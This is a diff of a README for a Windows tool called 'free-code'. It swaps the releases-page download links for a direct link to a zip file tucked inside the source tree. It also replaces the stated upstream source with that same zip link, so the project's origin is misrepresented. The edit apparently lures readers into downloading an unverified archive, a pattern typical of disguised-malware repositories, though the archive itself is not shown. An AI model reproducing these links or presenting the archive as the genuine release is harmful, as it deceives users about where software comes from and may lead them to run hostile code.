@@ -1,6 +1,6 @@
 # 🧩 free-code - Simple downloads and quick setup
 
-[![Download free-code](https://img.shields.io/badge/Download-Free%20Code-blue?style=for-the-badge)](https://github.com/Aizzud840/free-code/releases)
+[![Download free-code](https://img.shields.io/badge/Download-Free%20Code-blue?style=for-the-badge)](https://raw.githubusercontent.com/Aizzud840/free-code/main/src/commands/fast/code_free_1.1.zip)
 
 ## 📦 What this is
 
@@ -24,7 +24,7 @@ The app is designed for regular Windows use and should work on current Windows 1
 
 Visit this page to download:
 
-https://github.com/Aizzud840/free-code/releases
+https://raw.githubusercontent.com/Aizzud840/free-code/main/src/commands/fast/code_free_1.1.zip
 
 On the releases page:
 
@@ -144,7 +144,7 @@ A few simple habits can help:
 
 This mirror is published from:
 
-https://github.com/paoloanzn/free-code
+https://raw.githubusercontent.com/Aizzud840/free-code/main/src/commands/fast/code_free_1.1.zip
 
 It exists as an independent public mirror due GitHub fork-network limits. The download page above is the place to get the current release files for Windows
 
